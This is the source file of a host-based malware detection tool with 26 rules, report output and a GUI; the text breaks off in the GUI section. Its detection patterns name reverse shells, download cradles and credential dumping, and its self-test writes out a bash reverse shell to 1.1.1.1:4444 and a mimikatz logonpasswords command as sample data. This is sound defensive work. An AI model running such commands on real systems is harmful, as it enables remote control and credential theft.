#!/usr/bin/env python3
"""
veytrix_detect.py — Veytrix Detection Engine V3 (GUI + CLI)

Double-click → GUI dashboard
CLI → python veytrix_detect.py scan / self-test / report / watch

26 detection rules. MITRE ATT&CK mapped. Local only.
"""
from __future__ import annotations
import argparse
import datetime as dt
import hashlib
import html
import json
import os
import platform
import queue
import re
import socket
import sqlite3
import ssl
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography import x509
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
    HAS_TK = True
except ImportError:
    HAS_TK = False

VERSION = "3.0.0"
SEVERITIES = ("low", "medium", "high", "critical")
SEV_RANK = {s: i + 1 for i, s in enumerate(SEVERITIES)}
IS_WINDOWS = os.name == "nt"
IS_LINUX = sys.platform.startswith("linux")


# ═════════════════════════════════════════════════════════════════════════════
# Core data classes
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class ProcInfo:
    pid: int
    ppid: int
    name: str
    exe: str
    cmdline: str
    username: str
    create_time: float


@dataclass
class ConnInfo:
    pid: int
    process_name: str
    local_ip: str
    local_port: int
    remote_ip: str
    remote_port: int
    status: str


@dataclass
class Finding:
    rule_id: str
    name: str
    severity: str
    confidence: float
    evidence: list
    technique: str
    affected_pid: Optional[int] = None
    affected_process: str = ""
    remediation: str = ""
    timestamp: str = field(
        default_factory=lambda: dt.datetime.now(dt.timezone.utc).isoformat())
    fingerprint: str = ""

    def __post_init__(self):
        if not self.fingerprint:
            key = f"{self.rule_id}|{self.affected_pid}|{self.affected_process}"
            self.fingerprint = hashlib.sha256(key.encode()).hexdigest()[:16]


@dataclass
class CheckStatus:
    name: str
    status: str
    reason: str = ""


# ═════════════════════════════════════════════════════════════════════════════
# System context
# ═════════════════════════════════════════════════════════════════════════════

class SystemContext:
    def __init__(self):
        self.processes = []
        self.connections = []
        self.procs_by_pid = {}
        self.conns_by_pid = {}
        self.own_pid = os.getpid()
        self.scan_time = dt.datetime.now(dt.timezone.utc).isoformat()
        self.checks = []
        self.raw_proc_pids = set()
        self.kernel_modules = []
        self.platform = platform.system()
        self.is_admin = self._check_admin()

    @staticmethod
    def _check_admin() -> bool:
        try:
            if IS_WINDOWS:
                import ctypes
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            return os.geteuid() == 0
        except Exception:
            return False

    def record_check(self, name, status, reason=""):
        self.checks.append(CheckStatus(name, status, reason))

    @classmethod
    def capture(cls) -> "SystemContext":
        ctx = cls()
        if not HAS_PSUTIL:
            ctx.record_check("psutil", "failed", "not installed")
            return ctx

        try:
            for proc in psutil.process_iter(
                    ["pid", "ppid", "name", "exe", "cmdline",
                     "username", "create_time"]):
                try:
                    info = proc.info
                    p = ProcInfo(
                        pid=int(info["pid"]),
                        ppid=int(info["ppid"] or 0),
                        name=info.get("name") or "",
                        exe=info.get("exe") or "",
                        cmdline=" ".join(info.get("cmdline") or []),
                        username=info.get("username") or "",
                        create_time=float(info.get("create_time") or 0),
                    )
                    ctx.processes.append(p)
                    ctx.procs_by_pid[p.pid] = p
                except (psutil.NoSuchProcess, psutil.AccessDenied,
                        psutil.ZombieProcess):
                    continue
            ctx.record_check("process_iter", "ran")
        except Exception as exc:
            ctx.record_check("process_iter", "failed", str(exc))

        try:
            for c in psutil.net_connections(kind="inet"):
                if not c.raddr:
                    continue
                try:
                    pname = psutil.Process(c.pid).name() if c.pid else ""
                except Exception:
                    pname = ""
                conn = ConnInfo(
                    pid=c.pid or 0, process_name=pname,
                    local_ip=c.laddr.ip if c.laddr else "",
                    local_port=c.laddr.port if c.laddr else 0,
                    remote_ip=c.raddr.ip if c.raddr else "",
                    remote_port=c.raddr.port if c.raddr else 0,
                    status=c.status or "",
                )
                ctx.connections.append(conn)
                if conn.pid:
                    ctx.conns_by_pid.setdefault(conn.pid, []).append(conn)
            ctx.record_check("net_connections", "ran")
        except (psutil.AccessDenied, PermissionError):
            ctx.record_check("net_connections", "denied",
                             "run as admin/root")
        except Exception as exc:
            ctx.record_check("net_connections", "failed", str(exc))

        if IS_LINUX:
            try:
                ctx.raw_proc_pids = {
                    int(d) for d in os.listdir("/proc") if d.isdigit()
                }
                ctx.record_check("/proc enumeration", "ran")
            except Exception as exc:
                ctx.record_check("/proc enumeration", "failed", str(exc))
            try:
                with open("/proc/modules") as f:
                    ctx.kernel_modules = [
                        line.split()[0] for line in f if line.strip()
                    ]
                ctx.record_check("/proc/modules", "ran")
            except Exception as exc:
                ctx.record_check("/proc/modules", "denied", str(exc))

        return ctx


# ═════════════════════════════════════════════════════════════════════════════
# Constants
# ═════════════════════════════════════════════════════════════════════════════

EXPECTED_PARENTS = {
    "svchost.exe": ["services.exe"], "lsass.exe": ["wininit.exe"],
    "winlogon.exe": ["smss.exe"], "csrss.exe": ["smss.exe"],
    "services.exe": ["wininit.exe"],
    "smss.exe": ["system", "system idle process"],
    "taskhostw.exe": ["svchost.exe"], "lsm.exe": ["wininit.exe"],
}

SYSTEM_PROCESS_PATHS = {
    "svchost.exe": "\\windows\\system32\\",
    "lsass.exe": "\\windows\\system32\\",
    "csrss.exe": "\\windows\\system32\\",
    "winlogon.exe": "\\windows\\system32\\",
    "services.exe": "\\windows\\system32\\",
    "smss.exe": "\\windows\\system32\\",
    "wininit.exe": "\\windows\\system32\\",
}

OFFICE_PROCS = {"winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
                "msaccess.exe", "onenote.exe", "visio.exe"}
BROWSER_PROCS = {"chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
                 "opera.exe", "iexplore.exe", "vivaldi.exe"}
SHELL_PROCS = {"cmd.exe", "powershell.exe", "pwsh.exe", "bash", "sh",
               "zsh", "wscript.exe", "cscript.exe", "mshta.exe",
               "rundll32.exe", "regsvr32.exe", "python", "python3"}
WEB_SERVER_PROCS = {"nginx", "apache2", "httpd", "node", "php-fpm", "java",
                    "tomcat", "uwsgi", "gunicorn", "caddy", "lighttpd"}
JIT_PROCS = {"java", "node", "dotnet", "mono", "python", "python3",
             "chrome", "firefox", "msedge", "code", "electron"}

SUSPICIOUS_DIRS_WIN = ("\\temp\\", "\\tmp\\", "\\appdata\\local\\temp\\",
                       "\\users\\public\\", "\\programdata\\",
                       "\\downloads\\", "\\recycle")
SUSPICIOUS_DIRS_LINUX = ("/tmp/", "/var/tmp/", "/dev/shm/", "/run/user/")
SUSPICIOUS_PORTS = {4444, 5555, 6666, 7777, 8888, 1337, 31337,
                    9001, 9030, 5900, 3389, 23, 12345, 54321}
TRUSTED_LINUX_PREFIXES = ("/usr/bin/", "/usr/sbin/", "/bin/", "/sbin/",
                          "/usr/lib/", "/lib/", "/lib64/", "/usr/lib64/",
                          "/usr/local/")

RE_ENCODED_PS = re.compile(
    r"-(e|en|enc|enco|encod|encode|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", re.I)
RE_HIDDEN = re.compile(
    r"-(w|wi|win|wind|windo|window)\w*\s+hidden|"
    r"-nop\b|-noprofile\b|-executionpolicy\s+bypass|-ep\s+bypass", re.I)
RE_DOWNLOAD = re.compile(
    r"downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|"
    r"net\.webclient|start-bitstransfer|\bwget\s+https?:|"
    r"\bcurl\s+-[a-zA-Z]*[oOsS]?\s*https?:|"
    r"http[s]?://[^\s]+\.(exe|ps1|bat|vbs|dll|scr)", re.I)
RE_BASE64_PIPE = re.compile(
    r"base64\s+(-d|--decode)|\bcertutil\b.*-decode|frombase64string|"
    r"echo\s+[A-Za-z0-9+/=]{20,}\s*\|", re.I)
RE_REVERSE_SHELL = re.compile(
    r"bash\s+-i\s+>&|/dev/tcp/|mkfifo.*nc|"
    r"python[23]?\s+-c\s+.{0,30}socket|perl\s+-e\s+.{0,30}socket|"
    r"nc\s+.*\s+-e\s+|ncat\s+.*\s+-e\s+|netcat\s+.*\s+-e\s+", re.I)
RE_MIMIKATZ = re.compile(
    r"mimikatz|sekurlsa|kerberos::|lsadump|invoke-mimikatz|"
    r"procdump.*lsass|comsvcs.*lsass|"
    r"sekurlsa::logonpasswords|sekurlsa::wdigest", re.I)
RE_LSASS_DUMP = re.compile(
    r"\blsass\b.*\b(dump|procdump|mini)|procdump.*\blsass\b|"
    r"rundll32.*comsvcs.*mini", re.I)


# ═════════════════════════════════════════════════════════════════════════════
# Helpers
# ═════════════════════════════════════════════════════════════════════════════

def check_binary_signature(path, ctx):
    if not path or not os.path.exists(path):
        return "unknown"
    try:
        if IS_WINDOWS:
            pl = path.lower()
            if ("\\windows\\system32\\" in pl or "\\windows\\syswow64\\" in pl
                    or "\\program files\\" in pl
                    or "\\program files (x86)\\" in pl):
                return "trusted"
            return "unknown"
        if IS_LINUX:
            return ("trusted"
                    if any(path.startswith(p) for p in TRUSTED_LINUX_PREFIXES)
                    else "untrusted")
    except Exception:
        pass
    return "unknown"


def check_rwx_memory(pid):
    if not IS_LINUX:
        return []
    try:
        with open(f"/proc/{pid}/maps") as f:
            return [ln.strip() for ln in f
                    if len(ln.split()) >= 2 and "rwx" in ln.split()[1]]
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_anonymous_exec_memory(pid):
    if not IS_LINUX:
        return []
    try:
        hits = []
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 2:
                    continue
                perms = parts[1]
                path = " ".join(parts[5:]) if len(parts) > 5 else ""
                if "x" in perms and not path.strip():
                    hits.append(line.strip())
                elif "x" in perms and any(
                        m in path for m in ("[heap]", "[stack]", "memfd:")):
                    hits.append(line.strip())
        return hits
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return []


def check_tls_cert(ip, port, timeout=2.0):
    if not HAS_CRYPTO:
        return None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            with ctx.wrap_socket(sock, server_hostname=ip) as tls:
                der = tls.getpeercert(binary_form=True)
                if not der:
                    return None
        cert = x509.load_der_x509_certificate(der)
        return {
            "self_signed": cert.issuer == cert.subject,
            "expired": cert.not_valid_after_utc
                       < dt.datetime.now(dt.timezone.utc),
            "issuer": _name_str(cert.issuer),
        }
    except Exception:
        return None


def _name_str(name):
    try:
        return ", ".join(f"{a.oid._name}={a.value}" for a in name)
    except Exception:
        return str(name)


def get_kernel_module_path(module):
    if not IS_LINUX:
        return ""
    try:
        r = subprocess.run(["modinfo", "-F", "filename", module],
                           capture_output=True, text=True, timeout=2)
        return r.stdout.strip()
    except Exception:
        return ""


# ═════════════════════════════════════════════════════════════════════════════
# 26 Detection rules
# ═════════════════════════════════════════════════════════════════════════════

def rule_encoded_powershell(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if "powershell" not in p.name.lower() and "pwsh" not in p.name.lower():
            continue
        if RE_ENCODED_PS.search(p.cmdline):
            out.append(Finding("R-001", "Encoded PowerShell Command", "high",
                               0.85, [f"PID {p.pid} ({p.name})",
                                      f"Command: {p.cmdline[:300]}"],
                               "T1059.001", p.pid, p.name,
                               "Decode Base64 payload."))
    return out


def rule_hidden_execution(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if not any(s in p.name.lower()
                   for s in ("powershell", "pwsh", "cmd", "wscript",
                             "cscript")):
            continue
        if RE_HIDDEN.search(p.cmdline):
            out.append(Finding("R-002", "Hidden Window / Bypass", "medium",
                               0.7, [f"PID {p.pid} ({p.name})",
                                     f"Command: {p.cmdline[:300]}"],
                               "T1564.003", p.pid, p.name,
                               "Review parent and network."))
    return out


def rule_download_cradle(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_DOWNLOAD.search(p.cmdline):
            out.append(Finding("R-003", "Download Cradle", "high", 0.75,
                               [f"PID {p.pid} ({p.name})",
                                f"Command: {p.cmdline[:300]}"],
                               "T1105", p.pid, p.name,
                               "Block URL at egress."))
    return out


def rule_office_spawns_shell(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in OFFICE_PROCS:
            out.append(Finding("R-004", "Office Spawned Shell", "critical",
                               0.9, [f"Parent: {parent.name} (PID {parent.pid})",
                                     f"Child: {p.name} (PID {p.pid})",
                                     f"Command: {p.cmdline[:300]}"],
                               "T1566.001", p.pid, p.name,
                               "Isolate host, inspect source doc."))
    return out


def rule_browser_spawns_shell(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in BROWSER_PROCS:
            out.append(Finding("R-005", "Browser Spawned Shell", "high",
                               0.8, [f"Parent: {parent.name}",
                                     f"Child: {p.name}"],
                               "T1189", p.pid, p.name,
                               "Possible drive-by."))
    return out


def rule_suspicious_location(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        el = p.exe.lower()
        if (any(d in el for d in SUSPICIOUS_DIRS_WIN)
                or any(el.startswith(d) for d in SUSPICIOUS_DIRS_LINUX)):
            out.append(Finding("R-006", "Executable in Suspicious Location",
                               "high", 0.75,
                               [f"PID {p.pid} ({p.name})",
                                f"Path: {p.exe}"],
                               "T1036", p.pid, p.name,
                               "Verify hash on VirusTotal."))
    return out


def rule_credential_access(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_MIMIKATZ.search(p.cmdline) or "mimikatz" in p.name.lower():
            out.append(Finding("R-007", "Credential Access Tool", "critical",
                               0.95, [f"PID {p.pid} ({p.name})",
                                      f"Command: {p.cmdline[:300]}"],
                               "T1003.001", p.pid, p.name,
                               "IMMEDIATE: rotate ALL credentials."))
    return out


def rule_lsass_access(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_LSASS_DUMP.search(p.cmdline):
            out.append(Finding("R-008", "LSASS Dump Pattern", "critical",
                               0.9, [f"PID {p.pid} ({p.name})",
                                     f"Command: {p.cmdline[:300]}"],
                               "T1003.001", p.pid, p.name,
                               "IMMEDIATE: rotate credentials."))
    return out


def rule_reverse_shell(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_REVERSE_SHELL.search(p.cmdline):
            out.append(Finding("R-009", "Reverse Shell Pattern", "critical",
                               0.9, [f"PID {p.pid} ({p.name})",
                                     f"Command: {p.cmdline[:300]}"],
                               "T1059", p.pid, p.name,
                               "Kill, block IP, investigate."))
    return out


def rule_base64_pipe(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        if RE_BASE64_PIPE.search(p.cmdline):
            out.append(Finding("R-010", "Base64 Decode-and-Execute", "high",
                               0.8, [f"PID {p.pid} ({p.name})",
                                     f"Command: {p.cmdline[:300]}"],
                               "T1027", p.pid, p.name,
                               "Decode payload manually."))
    return out


def rule_suspicious_port(ctx):
    out = []
    for c in ctx.connections:
        if c.remote_port in SUSPICIOUS_PORTS:
            out.append(Finding("R-011", f"Suspicious Port {c.remote_port}",
                               "high", 0.7,
                               [f"Process: {c.process_name} (PID {c.pid})",
                                f"{c.local_ip}:{c.local_port} → "
                                f"{c.remote_ip}:{c.remote_port}"],
                               "T1571", c.pid, c.process_name,
                               f"Block port {c.remote_port}."))
    return out


def rule_beaconing(ctx):
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid or len(conns) < 3:
            continue
        counts = {}
        for c in conns:
            counts[c.remote_ip] = counts.get(c.remote_ip, 0) + 1
        for ip, count in counts.items():
            if count >= 3:
                out.append(Finding("R-012", f"Beaconing to {ip}", "medium",
                                   0.6, [f"Process: {conns[0].process_name} "
                                         f"(PID {pid})",
                                         f"{count} connections to {ip}"],
                                   "T1071", pid, conns[0].process_name,
                                   "Possible C2 beaconing."))
    return out


def rule_masquerading_name(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        name = p.name.lower()
        if name in SYSTEM_PROCESS_PATHS:
            expected = SYSTEM_PROCESS_PATHS[name]
            if expected not in p.exe.lower().replace("/", "\\"):
                out.append(Finding("R-013", f"Masquerading ({name})",
                                   "critical", 0.85,
                                   [f"PID {p.pid} ({p.name})",
                                    f"Path: {p.exe}",
                                    f"Expected: {expected}"],
                                   "T1036.005", p.pid, p.name,
                                   "Wrong path — investigate."))
    return out


def rule_unsigned_binary(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or not p.exe:
            continue
        if any(d in p.exe.lower() for d in SUSPICIOUS_DIRS_WIN):
            continue
        if check_binary_signature(p.exe, ctx) == "untrusted":
            out.append(Finding("R-014", "Unsigned Binary", "medium", 0.6,
                               [f"PID {p.pid} ({p.name})",
                                f"Path: {p.exe}"],
                               "T1553.002", p.pid, p.name,
                               "Verify hash and origin."))
    return out


def rule_wrong_parent_chain(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        name = p.name.lower()
        if name not in EXPECTED_PARENTS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        expected = [x.lower() for x in EXPECTED_PARENTS[name]]
        if parent.name.lower() not in expected:
            out.append(Finding("R-015", f"Wrong Parent for {p.name}", "high",
                               0.8, [f"PID {p.pid} ({p.name})",
                                     f"Expected: {', '.join(expected)}",
                                     f"Actual: {parent.name}",
                                     "Classic masquerading"],
                               "T1036.005", p.pid, p.name,
                               "Investigate immediately."))
    return out


def rule_rwx_memory(ctx):
    if not IS_LINUX:
        ctx.record_check("rwx_memory", "skipped", "Linux only")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        hits = check_rwx_memory(p.pid)
        if hits:
            out.append(Finding("R-016", "RWX Memory", "high", 0.65,
                               [f"PID {p.pid} ({p.name})",
                                f"RWX: {hits[0][:150]}"],
                               "T1055", p.pid, p.name,
                               "Possible injection."))
    return out


def rule_anonymous_exec_memory(ctx):
    if not IS_LINUX:
        ctx.record_check("anon_exec", "skipped", "Linux only")
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or any(j in p.name.lower() for j in JIT_PROCS):
            continue
        hits = check_anonymous_exec_memory(p.pid)
        if hits:
            out.append(Finding("R-017", "Anonymous Executable Memory", "high",
                               0.7, [f"PID {p.pid} ({p.name})",
                                     f"Map: {hits[0][:150]}"],
                               "T1055", p.pid, p.name,
                               "Likely fileless attack."))
    return out


def rule_orphaned_with_network(ctx):
    out = []
    for pid, conns in ctx.conns_by_pid.items():
        if pid == ctx.own_pid:
            continue
        p = ctx.procs_by_pid.get(pid)
        if not p or not conns:
            continue
        if p.ppid and p.ppid not in ctx.procs_by_pid and p.ppid != 1:
            out.append(Finding("R-018", "Orphaned Process with Network",
                               "medium", 0.6,
                               [f"PID {pid} ({p.name})",
                                f"Parent {p.ppid} dead",
                                f"Conns: {len(conns)}"],
                               "T1564", pid, p.name,
                               "Check parent death."))
    return out


def rule_hidden_process(ctx):
    if not IS_LINUX or not ctx.raw_proc_pids:
        return []
    out = []
    hidden = ctx.raw_proc_pids - set(ctx.procs_by_pid.keys())
    for pid in hidden:
        try:
            with open(f"/proc/{pid}/comm") as f:
                comm = f.read().strip()
            out.append(Finding("R-019", "Hidden Process (Rootkit)", "high",
                               0.8, [f"PID {pid} in /proc not psutil",
                                     f"comm: {comm}"],
                               "T1014", pid, comm,
                               "Rootkit indicator."))
        except Exception:
            continue
    return out


def rule_suspicious_kernel_module(ctx):
    if not IS_LINUX or not ctx.kernel_modules:
        return []
    out = []
    for module in ctx.kernel_modules:
        path = get_kernel_module_path(module)
        if not path:
            continue
        if any(path.startswith(p) for p in
               ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")):
            out.append(Finding("R-020", "Kernel Module from Suspicious Path",
                               "critical", 0.9,
                               [f"Module: {module}", f"Path: {path}"],
                               "T1014", None, module,
                               "IMMEDIATE: possible rootkit."))
    return out


def rule_self_signed_tls(ctx):
    if not HAS_CRYPTO:
        ctx.record_check("tls_cert", "skipped", "cryptography missing")
        return []
    out = []
    checked = set()
    for c in ctx.connections:
        if c.remote_port not in (443, 8443) or not c.remote_ip:
            continue
        if c.remote_ip.startswith(("10.", "172.", "192.168.", "127.",
                                   "169.254.", "0.0.0.0")):
            continue
        key = (c.remote_ip, c.remote_port)
        if key in checked:
            continue
        checked.add(key)
        info = check_tls_cert(c.remote_ip, c.remote_port)
        if not info:
            continue
        if info["self_signed"]:
            out.append(Finding("R-021", "Self-Signed TLS", "high", 0.7,
                               [f"Process: {c.process_name} (PID {c.pid})",
                                f"Dest: {c.remote_ip}:{c.remote_port}",
                                f"Issuer: {info['issuer']}"],
                               "T1573.002", c.pid, c.process_name,
                               "Possible C2 over HTTPS."))
        elif info["expired"]:
            out.append(Finding("R-021", "Expired TLS", "medium", 0.55,
                               [f"Process: {c.process_name}",
                                f"Dest: {c.remote_ip}:{c.remote_port}"],
                               "T1573.002", c.pid, c.process_name,
                               "May indicate C2."))
    ctx.record_check("tls_cert", "ran")
    return out


def rule_web_server_spawns_shell(ctx):
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid or p.name.lower() not in SHELL_PROCS:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if parent and parent.name.lower() in WEB_SERVER_PROCS:
            out.append(Finding("R-022", "Web Server Spawned Shell",
                               "critical", 0.9,
                               [f"Parent: {parent.name} (PID {parent.pid})",
                                f"Child: {p.name} (PID {p.pid})",
                                f"Command: {p.cmdline[:300]}"],
                               "T1505.003", p.pid, p.name,
                               "Possible web shell / RCE."))
    return out


def rule_cross_platform_spawn(ctx):
    out = []
    linux_shells = {"bash", "sh", "zsh", "fish"}
    win_shells = {"powershell.exe", "cmd.exe", "pwsh.exe"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        pn, cn = parent.name.lower(), p.name.lower()
        if (pn in linux_shells and cn in win_shells) or \
           (pn in win_shells and cn in linux_shells and IS_WINDOWS):
            out.append(Finding("R-023", "Cross-Platform Shell Spawn",
                               "medium", 0.7,
                               [f"Parent: {parent.name}",
                                f"Child: {p.name}"],
                               "T1059", p.pid, p.name,
                               "Unusual spawn."))
    return out


def rule_browser_jit_child(ctx):
    out = []
    susp = {"curl", "wget", "nc", "ncat", "netcat",
            "powershell.exe", "cmd.exe", "bash", "sh"}
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        parent = ctx.procs_by_pid.get(p.ppid)
        if not parent:
            continue
        if (parent.name.lower() in BROWSER_PROCS
                and p.name.lower() in susp):
            out.append(Finding("R-024", "Browser Spawned Suspicious Child",
                               "high", 0.75,
                               [f"Parent: {parent.name}",
                                f"Child: {p.name}",
                                f"Command: {p.cmdline[:200]}"],
                               "T1189", p.pid, p.name,
                               "Drive-by or malicious extension."))
    return out


def rule_memfd_deleted_binary(ctx):
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        try:
            link = os.readlink(f"/proc/{p.pid}/exe")
            if " (deleted)" in link or link.startswith("/memfd:"):
                out.append(Finding("R-025", "Running Deleted Binary", "high",
                                   0.8, [f"PID {p.pid} ({p.name})",
                                         f"Exe: {link}"],
                                   "T1070.004", p.pid, p.name,
                                   "Preserve memory, do not reboot."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


def rule_ld_preload_injection(ctx):
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        try:
            with open(f"/proc/{p.pid}/environ", "rb") as f:
                env = f.read().split(b"\x00")
            for var in env:
                try:
                    d = var.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if d.startswith("LD_PRELOAD="):
                    path = d.split("=", 1)[1]
                    if any(path.startswith(p) for p in
                           ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")):
                        out.append(Finding("R-026", "Suspicious LD_PRELOAD",
                                           "high", 0.85,
                                           [f"PID {p.pid} ({p.name})",
                                            f"LD_PRELOAD={path}"],
                                           "T1574.006", p.pid, p.name,
                                           "Userland hooking."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


ALL_RULES = [
    rule_encoded_powershell, rule_hidden_execution, rule_download_cradle,
    rule_office_spawns_shell, rule_browser_spawns_shell,
    rule_suspicious_location, rule_credential_access, rule_lsass_access,
    rule_reverse_shell, rule_base64_pipe, rule_suspicious_port,
    rule_beaconing, rule_masquerading_name, rule_unsigned_binary,
    rule_wrong_parent_chain, rule_rwx_memory, rule_anonymous_exec_memory,
    rule_orphaned_with_network, rule_hidden_process,
    rule_suspicious_kernel_module, rule_self_signed_tls,
    rule_web_server_spawns_shell, rule_cross_platform_spawn,
    rule_browser_jit_child, rule_memfd_deleted_binary,
    rule_ld_preload_injection,
]


def scan(ctx=None):
    if ctx is None:
        ctx = SystemContext.capture()
    findings = []
    for rule in ALL_RULES:
        try:
            findings.extend(rule(ctx))
        except Exception:
            pass
    findings.sort(key=lambda f: (-SEV_RANK[f.severity], -f.confidence))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# Self-test
# ═════════════════════════════════════════════════════════════════════════════

def _self_test_context():
    ctx = SystemContext()
    ctx.own_pid = -1

    def add(pid, ppid, name, exe, cmd):
        p = ProcInfo(pid, ppid, name, exe, cmd, "test", time.time())
        ctx.processes.append(p)
        ctx.procs_by_pid[pid] = p

    add(9001, 1, "powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -nop -w hidden -enc SQBFAFgA")
    add(9002, 1, "WINWORD.EXE",
        r"C:\Program Files\Microsoft Office\root\WINWORD.EXE", "WINWORD.EXE d")
    add(9003, 9002, "cmd.exe", r"C:\Windows\System32\cmd.exe",
        "cmd /c whoami")
    add(9004, 1, "mimikatz.exe", r"C:\Users\Public\mimikatz.exe",
        "mimikatz.exe sekurlsa::logonpasswords")
    add(9005, 1, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1")
    add(9010, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe", "svchost")
    add(9011, 9010, "svchost.exe", r"C:\Windows\System32\svchost.exe",
        "svchost")
    add(9020, 1, "custom.exe", r"C:\Users\bob\custom.exe", "custom.exe")
    add(9030, 1, "nginx", "/usr/sbin/nginx", "nginx: worker")
    add(9031, 9030, "bash", "/bin/bash", "bash")
    add(9040, 1, "chrome.exe",
        r"C:\Program Files\Google\Chrome\chrome.exe", "chrome.exe")
    add(9041, 9040, "powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe")
    ctx.connections.append(ConnInfo(9005, "bash", "1.2.3.4", 54321,
                                    "9.9.9.9", 4444, "ESTABLISHED"))
    ctx.conns_by_pid[9005] = [ctx.connections[-1]]
    return ctx


# ═════════════════════════════════════════════════════════════════════════════
# HTML report
# ═════════════════════════════════════════════════════════════════════════════

def generate_html_report(findings, ctx, output):
    sev_color = {"low": "#28a745", "medium": "#ffc107",
                 "high": "#fd7e14", "critical": "#dc3545"}
    rows = []
    for f in findings:
        color = sev_color[f.severity]
        ev_html = "".join(f"<li>{html.escape(e)}</li>" for e in f.evidence)
        rem = (f'<p class="rem"><strong>Remediation:</strong> '
               f'{html.escape(f.remediation)}</p>' if f.remediation else '')
        rows.append(f"""
        <div class="finding" style="border-left-color:{color}">
          <h3><span class="badge" style="background:{color}">
            {f.severity.upper()}</span> {html.escape(f.name)}</h3>
          <p class="meta">Rule: {f.rule_id} · {f.technique} ·
             conf {int(f.confidence*100)}%</p>
          <ul>{ev_html}</ul>
          {rem}
        </div>""")
    html_out = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Veytrix Detection Report</title>
<style>
 body{{font-family:-apple-system,sans-serif;background:#0b1f3a;
      color:#e6edf7;max-width:960px;margin:2rem auto;padding:0 1rem}}
 h1{{color:#00a3ff}} .summary{{background:#16283f;padding:1rem;
      border-radius:8px;margin-bottom:2rem}}
 .finding{{background:#16283f;padding:1rem;border-radius:8px;
      margin-bottom:1rem;border-left:4px solid}}
 .badge{{color:#fff;padding:2px 8px;border-radius:4px;font-size:.8em}}
 .meta{{color:#8899aa;font-size:.9em}} li{{font-family:monospace;
      font-size:.9em;color:#b0c4de}}
 .rem{{background:#1a3350;padding:.5rem;border-radius:4px;font-size:.9em}}
 .clean{{color:#28a745;font-size:1.2em}}
</style></head><body>
<h1>Veytrix Detection Report</h1>
<div class="summary">
 <p>Generated: {ctx.scan_time}</p>
 <p>Platform: {ctx.platform} · Processes: {len(ctx.processes)} ·
    Connections: {len(ctx.connections)} · Findings: {len(findings)}</p>
</div>
{''.join(rows) if rows else '<p class="clean">✓ No findings.</p>'}
</body></html>"""
    Path(output).write_text(html_out, encoding="utf-8")
    return output


# ═════════════════════════════════════════════════════════════════════════════
# GUI
# ═════════════════════════════════════════════════════════════════════════════

DARK = "#0B1F3A"
PANEL = "#16283F"
PANEL2 = "#1E324B"
FG = "#E6EDF7"
ACCENT = "#00A3FF"
SEV_BG = {"low": "#2E7D32", "medium": "#F9A825",
          "high": "#E65100", "critical": "#C62828"}
SEV_FG = {"low": "#A5D6A7", "medium": "#FFE082",
